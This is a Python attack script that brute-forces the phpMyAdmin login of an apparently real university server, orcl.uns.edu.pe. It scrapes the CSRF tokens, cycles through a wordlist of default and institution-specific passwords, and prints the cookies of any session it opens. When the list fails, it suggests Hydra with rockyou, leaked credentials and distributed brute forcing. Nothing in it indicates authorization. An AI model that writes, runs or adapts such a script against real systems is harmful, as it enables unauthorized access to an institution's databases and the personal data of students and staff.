#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
from urllib.parse import urlparse, quote
import re, urllib3
urllib3.disable_warnings()

base_url = 'https://orcl.uns.edu.pe'
s = requests.Session()
s.verify = False
s.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'text/html,application/xhtml+xml',
})

print("=" * 70)
print("BRUTE FORCE CON CAMPOS CORRECTOS: pma_username / pma_password")
print("=" * 70)

# Get token from login page
r = s.get(f"{base_url}/index.php", timeout=5)
token_match = re.search(r'name="token" value="([^"]+)"', r.text)
CSRF_TOKEN = token_match.group(1) if token_match else ""
set_session_match = re.search(r'name="set_session" value="([^"]+)"', r.text)
SET_SESSION = set_session_match.group(1) if set_session_match else ""
print(f"CSRF Token: {CSRF_TOKEN}")
print(f"Set Session: {SET_SESSION}")

# Extended wordlist for university systems
wordlist = [
    ("root", ""), ("root", "root"), ("root", "toor"), ("root", "password"),
    ("root", "mysql"), ("root", "admin"), ("root", "123456"),
    ("root", "admin123"), ("root", "pass"), ("root", "1234"),
    ("root", "qwerty"), ("root", "abc123"), ("root", "letmein"),
    ("root", "master"), ("root", "default"), ("root", "changeme"),
    ("root", "welcome"), ("root", "Sistema"), ("root", "sistema"),
    ("root", "SistemaUNS"), ("root", "UNS2024"), ("root", "UNS2025"),
    ("root", "root123"), ("root", "passw0rd"), ("root", "P@ssw0rd"),
    ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
    ("admin", "1234"), ("admin", "admin123"), ("admin", "pass"),
    ("pma", "pma"), ("pma", "phpmyadmin"), ("pma", "pma123"),
    ("pma", "password"), ("pma", "123456"),
    ("uns", "uns"), ("uns", "uns123"), ("uns", "UNS"),
    ("uns", "uns2024"), ("uns", "uns2025"), ("uns", "uns.edu.pe"),
    ("uns", "Universidad"), ("uns", "SistemaUNS"),
    ("sistema", "sistema"), ("sistema", "123456"), ("sistema", "SistemaUNS"),
    ("sistema", "siigaa"), ("sistema", "sigea"),
    ("sistema", "SistemaUNS"),
    ("dbadmin", "dbadmin"), ("dbadmin", "password"),
    ("mysql", "mysql"), ("sa", "sa"),
    ("administrator", "administrator"),
    ("phpmyadmin", "phpmyadmin"),
    ("test", "test"), ("guest", "guest"),
    ("orcl", "orcl"), ("orcl", "oracle"),
    ("orcl", ""),
    ("usuario", "usuario"), ("usuario", "1234"),
    ("alumno", "alumno"), ("profesor", "profesor"),
    ("docente", "docente"),
    ("data", "data"), ("db", "db"),
    ("Sistema", "Sistema"), ("Sistema", "2024"),
    ("Sistema", "2025"),
    ("SistemaUNS", "SistemaUNS"),
    ("SistemaUNS", "2024"),
    ("admin", "SistemaUNS"), ("admin", "UNS2024"),
    ("root", "SistemaUNS"), ("root", "UNS2024"),
    ("root", "sistema2024"), ("root", "Sistema2024"),
    ("root", "SistemaUNS2024"), ("root", "SistemaUNS2025"),
    ("root", "Changeme123"), ("root", "P@ssw0rd123"),
    ("root", "Admin123"), ("root", "Root123"),
    ("root", "MySQL"), ("root", "MariaDB"),
    ("root", "orcl123"), ("root", "orcl_uns"),
    ("root", "UNS"), ("root", "UNS2026"),
    ("root", "pass123"), ("root", "password123"),
    ("root", "rootpass"), ("root", "rootroot"),
    ("admin", "Changeme"), ("admin", "Secret"),
    ("admin", "SistemaUNS2024"), ("admin", "UNS2025"),
    ("pma", "Sistema"), ("pma", "UNS"),
    ("pma", "SistemaUNS"), ("pma", "UNS2024"),
    ("sistema", "UNS"), ("sistema", "UNS2024"),
    ("sistema", "SistemaUNS"),
    ("usuario", "SistemaUNS"), ("usuario", "UNS2024"),
    ("alumno", "SistemaUNS"), ("profesor", "SistemaUNS"),
    ("docente", "SistemaUNS"),
    ("backup", "backup"), ("backup", "password"),
    ("root", "Sistema2025"), ("root", "UNS2026"),
    ("root", "orcl_uns.edu.pe"),
    ("root", "orcl.uns.edu.pe"),
    ("root", "190.119.171.165"),
]

# Build the correct login payload
# Form fields: pma_username, pma_password, server, token, target, set_session
logged_in = False

for username, password in wordlist:
    if logged_in:
        break
    
    payload = {
        "pma_username": username,
        "pma_password": password,
        "server": "1",
        "token": CSRF_TOKEN,
        "target": f"{base_url}/index.php",
        "set_session": SET_SESSION,
    }
    
    try:
        r = s.post(
            f"{base_url}/index.php",
            data=payload,
            timeout=5,
            allow_redirects=True
        )
        
        # Check if login was successful
        if "Logout" in r.text and "Logout form" in r.text:
            print(f"\n  [!] !!!! CREDENCIALES VALIDAS ENCONTRADAS !!!!")
            print(f"  [!] Usuario: {username}")
            print(f"  [!] Password: {password}")
            print(f"  [!] Sesion activa!")
            print(f"  [!] Cookies: {dict(s.cookies)}")
            logged_in = True
            break
        elif "server_error" in r.text or "error" in r.text.lower() and "login" not in r.text.lower():
            # Some error happened but not login-related
            pass
        elif len(r.text) < 500:
            # Very short response, might indicate redirect or error
            pass
        else:
            # Still showing login page - wrong credentials
            pass
            
    except Exception as e:
        pass

if not logged_in:
    print(f"\n  [-] Ninguna credencial funciono con la wordlist basica")
    print(f"  [-] Se necesitan wordlists mas extensas")
    print(f"  [-] Opciones:")
    print(f"      1. Usar Hydra: hydra -l root -P /usr/share/wordlists/rockyou.txt orcl.uns.edu.pe http-post-form")
    print(f"      2. Usar Burp Suite con wordlist grande")
    print(f"      3. Buscar credenciales filtradas en la web")
    print(f"      4. Intentar ataque de fuerza bruta distribuida")

# Also try the correct login field names with the original wordlist
print("\n\n--- Probando con pma_username/pma_password ---")
simple_list = [
    ("root", ""), ("root", "root"), ("root", "toor"),
    ("admin", "admin"), ("admin", "password"),
    ("pma", "pma"), ("uns", "uns123"),
    ("sistema", "sistema"), ("dbadmin", "dbadmin"),
    ("root", "password"), ("root", "123456"),
]

for username, password in simple_list:
    payload = {
        "pma_username": username,
        "pma_password": password,
        "server": "1",
        "token": CSRF_TOKEN,
        "target": f"{base_url}/index.php",
    }
    try:
        r = s.post(f"{base_url}/index.php", data=payload, timeout=5, allow_redirects=True)
        if "Logout" in r.text:
            print(f"  [!] CREDENCIALES: {username}/{password}")
            logged_in = True
            break
    except:
        pass

if not logged_in:
    print(f"  [-] Sin credenciales validas")

print("\n--- FIN ---")
